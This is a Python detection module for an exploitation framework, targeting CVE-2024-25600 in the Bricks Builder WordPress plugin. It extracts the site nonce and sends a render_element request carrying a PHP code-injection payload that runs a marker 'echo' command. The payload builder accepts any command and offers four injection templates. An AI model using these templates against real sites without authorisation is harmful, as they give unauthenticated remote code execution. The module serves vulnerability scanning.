#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Bricks Builder CVE-2024-25600 detection",
        "description": (
            "Detects potential unauthenticated RCE in Bricks Builder by extracting the frontend nonce "
            "and optionally running a harmless render_element marker probe."
        ),
        "author": ["watchTowr", "KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2024-25600",
        "references": [
            "https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT",
            "https://wpscan.com/vulnerability/8bab5266-7154-4b65-b5bc-07a91b379415/",
        ],
        "modules": [
            "exploits/multi/http/bricks_builder_cve_2024_25600_rce",
        ],
        "tags": ["web", "scanner", "wordpress", "bricks", "rce"],
    }

    base_path = OptString("/", "WordPress base path", required=False)
    payload_type = OptString("code", "Payload type: carousel|container|generic|code", required=False)
    pretty = OptBool(False, "Use pretty endpoint (/wp-json/...) instead of rest_route", required=False)
    post_id = OptString("1", "postId value used by render_element", required=False)
    active_probe = OptBool(True, "Send active marker probe to confirm command execution", required=False)
    marker = OptString("KS25600", "Marker used by active probe", required=False, advanced=True)

    def _prefix(self) -> str:
        bp = str(self.base_path or "/").strip()
        if not bp.startswith("/"):
            bp = "/" + bp
        return bp.rstrip("/")

    def _nonce_path(self) -> str:
        p = self._prefix()
        return f"{p}/" if p else "/"

    def _render_path(self) -> str:
        p = self._prefix()
        if self.pretty:
            return f"{p}/wp-json/bricks/v1/render_element" if p else "/wp-json/bricks/v1/render_element"
        return f"{p}/?rest_route=/bricks/v1/render_element" if p else "/?rest_route=/bricks/v1/render_element"

    @staticmethod
    def _extract_nonce(html: str) -> str:
        if not html:
            return ""
        m = re.search(r'"nonce":"([a-fA-F0-9]+)"', html)
        return m.group(1) if m else ""

    def _build_probe_payload(self, nonce: str, command: str) -> dict:
        payload_command = f'throw new Exception(`{command}` . "END");'
        base = {"postId": str(self.post_id), "nonce": nonce}
        query_settings = {"useQueryEditor": True, "queryEditor": payload_command}
        templates = {
            "carousel": {
                **base,
                "element": {"name": "carousel", "settings": {"type": "posts", "query": query_settings}},
            },
            "container": {
                **base,
                "element": {"name": "container", "settings": {"hasLoop": "true", "query": query_settings}},
            },
            "generic": {
                **base,
                "element": "1",
                "loopElement": {"settings": {"query": query_settings}},
            },
            "code": {
                **base,
                "element": {
                    "name": "code",
                    "settings": {"executeCode": "true", "code": f"<?php {payload_command} ?>"},
                },
            },
        }
        pt = str(self.payload_type or "code").strip().lower()
        return templates.get(pt, templates["code"])

    @staticmethod
    def _extract_exec_output(response) -> str:
        if not response or response.status_code != 200:
            return ""
        try:
            body = response.json() or {}
            html_content = ((body.get("data") or {}).get("html")) or ""
        except Exception:
            html_content = response.text or ""
        m = re.search(r"Exception: (.*?)END", html_content, re.DOTALL)
        return m.group(1).strip() if m else ""

    def run(self):
        try:
            home = self.http_request(method="GET", path=self._nonce_path(), timeout=10, allow_redirects=True)
            if not home or home.status_code != 200:
                return False

            nonce = self._extract_nonce(home.text or "")
            if not nonce:
                return False

            if not self.active_probe:
                self.set_info(
                    severity="medium",
                    cve="CVE-2024-25600",
                    reason="Bricks nonce found; active probe disabled",
                )
                return True

            marker = str(self.marker or "KS25600")
            probe_payload = self._build_probe_payload(nonce, f"echo {marker}")
            response = self.http_request(
                method="POST",
                path=self._render_path(),
                headers={"Content-Type": "application/json"},
                json=probe_payload,
                timeout=max(int(self.timeout or 10), 10),
            )
            out = self._extract_exec_output(response)
            if marker in out:
                self.set_info(
                    severity="critical",
                    cve="CVE-2024-25600",
                    reason="Nonce extracted and marker command executed via render_element",
                )
                return True

            if response and response.status_code == 200:
                self.set_info(
                    severity="high",
                    cve="CVE-2024-25600",
                    reason="Nonce extracted and render_element responded, but marker output not confirmed",
                )
                return True

            return False
        except Exception:
            return False
